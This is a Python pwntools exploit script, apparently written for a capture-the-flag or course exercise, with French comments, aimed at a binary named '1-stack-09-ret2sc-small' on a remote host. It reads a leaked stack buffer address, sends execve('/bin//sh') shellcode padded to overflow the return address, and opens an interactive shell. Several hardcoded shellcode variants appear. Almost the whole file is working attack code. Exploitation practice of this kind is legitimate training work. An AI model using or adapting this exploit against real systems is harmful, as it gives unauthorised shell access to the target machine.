#!/usr/bin/env python3
from pwn import *
import re
# Contexte
context.update(arch='amd64', timeout=1)

#Connexion au serveur
#google pour trouver ca c'est des shells
bin_name= "1-stack-09-ret2sc-small"
if args.GDB: # debug: local exploit with terminator/gef
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(f"./{bin_name}", """
    source /home/user/.gdbinit-gef.py
    break *(main+93)
    continue
    """)
elif args.LOCAL: # exploit locally
    p = process(f"./{bin_name}")
else: # exploit online
    p = remote("cytech.tcdn.casa", 4109)

shellcode27 = b"\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"
shellcode25 = b"\x48\x31\xD2\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
shellcode22 = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
shellcode22=b"\x58\x58\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
#Réception du message jusqu'à la ligne contenant l'adresse de RSP
rsp_message = p.recvuntil(b"DEBUG: buffer is at ")

#Réception de la ligne contenant l'adresse de RSP
rsp_line = p.recvline().strip()

#Extraction de l'adresse de RSP avec une expression régulière
rsp_value = re.search(b"0x[0-9a-fA-F]+", rsp_line).group()

#Conversion en entier (hexadécimal vers entier)
rsp_address = int(rsp_value, 16)

print(f"Adresse de RSP récupérée : {hex(rsp_address)}")

#Shellcode pour lire le fichier 'flag.txt'
#shellcode = asm(shellcraft.cat('flag.txt'))
shellcode = shellcode22
print(len(shellcode))
#Adresse cible (exemple donné)
target = p64(rsp_address)

#Envoi du payload avec un overflow et l'adresse cible
payload = shellcode +cyclic(27-len(shellcode)) + target 
p.sendline(payload)

#Interaction avec le shell
p.interactive()